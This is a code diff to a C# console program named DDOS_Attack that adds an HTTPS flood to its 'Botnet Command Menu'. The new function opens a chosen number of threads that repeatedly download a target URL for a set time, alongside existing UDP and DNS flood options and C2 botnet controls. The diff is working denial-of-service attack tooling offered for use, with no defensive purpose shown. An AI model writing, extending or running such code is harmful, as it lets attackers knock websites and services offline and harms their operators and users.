@@ -130,6 +130,50 @@ namespace DDOS_Attack
             }
         }
 
+        static void HTTPS_DDOSAttack(string targetURL, int numConnections, int attackDuration)
+        {
+            ManualResetEvent attackFinished = new ManualResetEvent(false);
+
+            List<Thread> threads = new List<Thread>();
+
+            for (int i = 0; i < numConnections; i++)
+            {
+                Thread thread = new Thread(() =>
+                {
+                    try
+                    {
+                        using (WebClient client = new WebClient())
+                        {
+                            DateTime endTime = DateTime.Now.AddSeconds(attackDuration);
+
+                            while (DateTime.Now < endTime)
+                            {
+                                client.DownloadData(targetURL);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("Error: " + ex.Message);
+                    }
+                    finally
+                    {
+                        attackFinished.Set();
+                    }
+                });
+
+                thread.Start();
+                threads.Add(thread);
+            }
+
+            foreach (Thread thread in threads)
+            {
+                thread.Join();
+            }
+
+            attackFinished.WaitOne();
+        }
+
         static void Main(string[] args)
         {
             Console.ForegroundColor = ConsoleColor.Green;
@@ -179,10 +223,11 @@ namespace DDOS_Attack
                     Console.WriteLine("Botnet Command Menu:");
                     Console.WriteLine("1. Start UDP DDOS Attack");
                     Console.WriteLine("2. Start DNS DDOS Attack");
-                    Console.WriteLine("3. Check Online Bots");
-                    Console.WriteLine("4. Shutdown Botnet");
-                    Console.WriteLine("5. Disconnect from Botnet");
-                    Console.WriteLine("6. Exit");
+                    Console.WriteLine("3. Start HTTPS DDOS Attack");
+                    Console.WriteLine("4. Check Online Bots");
+                    Console.WriteLine("5. Shutdown Botnet");
+                    Console.WriteLine("6. Disconnect from Botnet");
+                    Console.WriteLine("7. Exit");
 
                     Console.Write("Enter your choice: ");
                     string choice = Console.ReadLine();
@@ -196,18 +241,21 @@ namespace DDOS_Attack
                             StartDNSDDOSAttack();
                             break;
                         case "3":
-                            CheckOnlineBots(botnetIP, botnetPort);
+                            StartHTTPSDDOSAttack();
                             break;
                         case "4":
-                            Console.WriteLine("Shutting down botnet...");
+                            CheckOnlineBots(botnetIP, botnetPort);
                             break;
                         case "5":
+                            Console.WriteLine("Shutting down botnet...");
+                            break;
+                        case "6":
                             botnetHost = null;
                             botnetIP = null;
                             botnetPort = 0;
                             Console.WriteLine("Disconnected from botnet.");
                             break;
-                        case "6":
+                        case "7":
                             Console.WriteLine("Exiting...");
                             return;
                         default:
@@ -289,6 +337,15 @@ namespace DDOS_Attack
             DNS_DDOSAttack(targetIP, numRequests, attackDuration);
         }
 
+        static void StartHTTPSDDOSAttack()
+        {
+            string targetURL = GetValidURL("Enter the target URL (e.g., https://example.com): ");
+            int numConnections = GetValidNumber("Enter the number of connections: ");
+            int attackDuration = GetValidNumber("Enter the duration of the attack in seconds: ");
+
+            HTTPS_DDOSAttack(targetURL, numConnections, attackDuration);
+        }
+
         static void StartDDOSAttackThroughC2(string botnetIP, int botnetPort)
         {
             try
@@ -361,6 +418,24 @@ namespace DDOS_Attack
                 else
                 {
                     Console.WriteLine("Invalid IP address. Please enter a valid IP address.");
+                }
+            }
+        }
+
+        static string GetValidURL(string prompt)
+        {
+            while (true)
+            {
+                Console.Write(prompt);
+                string input = Console.ReadLine();
+
+                if (Uri.TryCreate(input, UriKind.Absolute, out Uri result) && (result.Scheme == Uri.UriSchemeHttp || result.Scheme == Uri.UriSchemeHttps))
+                {
+                    return input;
+                }
+                else
+                {
+                    Console.WriteLine("Invalid URL. Please enter a valid URL starting with 'http://' or 'https://'.");
                 }
             }
         }
